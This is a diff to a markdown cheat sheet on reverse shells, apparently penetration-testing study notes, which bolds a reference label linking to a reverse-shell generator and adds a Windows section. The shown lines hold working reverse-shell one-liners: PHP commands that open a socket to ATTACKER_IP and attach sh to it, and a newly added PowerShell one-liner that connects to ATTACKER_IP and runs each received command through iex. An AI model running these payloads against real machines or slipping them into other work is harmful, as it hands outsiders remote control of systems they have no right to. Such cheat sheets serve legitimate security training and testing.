@@ -1,6 +1,6 @@
 # Shells Overview: Summary & Cheat Sheet
 
-Reference:
+**Reference:**
 
 - [Online Reverse Shell Generator](https://www.revshells.com/)
 - [GitHub: reverse-shell-generator](https://github.com/0dayCTF/reverse-shell-generator)
@@ -60,6 +60,10 @@ The attacker waits to "catch" the connection from the target.
 - **PHP (Standard)**: `php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("sh <&3 >&3 2>&3");'`
 - **PHP (Alternative Functions)**: Replace `exec` with `shell_exec`, `passthru`, or `system`.
 - **PHP (popen)**: `php -r '$sock=fsockopen("ATTACKER_IP",PORT);popen("sh <&3 >&3 2>&3", "r");'`
+
+#### Windows
+
+- **PowerShell**: `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
 
 #### Others
 
